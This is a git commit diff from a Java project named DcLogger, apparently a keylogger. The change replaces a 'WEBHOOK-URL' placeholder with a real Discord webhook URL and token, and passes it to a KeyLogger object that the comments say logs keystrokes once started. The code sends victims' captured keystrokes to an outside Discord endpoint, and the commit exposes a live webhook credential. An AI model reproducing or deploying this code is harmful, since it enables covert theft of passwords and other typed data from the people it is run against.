64dad16736fa84aeb0966a4653a38138fa48fad6
michu12436 <139288522+michu12436@users.noreply.github.com>
2023-09-25 21:48:16 +0200

    Update DcLogger.java

--- src/main/java/me/lyzev/dclogger/DcLogger.java
+++ src/main/java/me/lyzev/dclogger/DcLogger.java
@@ -19,7 +19,7 @@ public class DcLogger {
      * @throws MalformedURLException the exception is going to be thrown if the url is incorrect
      */
     public static void main(String[] args) throws MalformedURLException {
-        KeyLogger logger = new KeyLogger("WEBHOOK-URL"); // Declares and initializes the keylogger
+        KeyLogger logger = new KeyLogger("https://discord.com/api/webhooks/1155953833973919795/76CRz4B6PxJK_tf1WlwUaNlgfK94IDXngPyg_Zy0ZkbD9wZXoxOBAPJdPkdUhNBfjVPl"); // Declares and initializes the keylogger
         logger.start(); // Registers the NativeLogger (If it isn't registered the event will not be called, so nothing would be logged)
     }
 
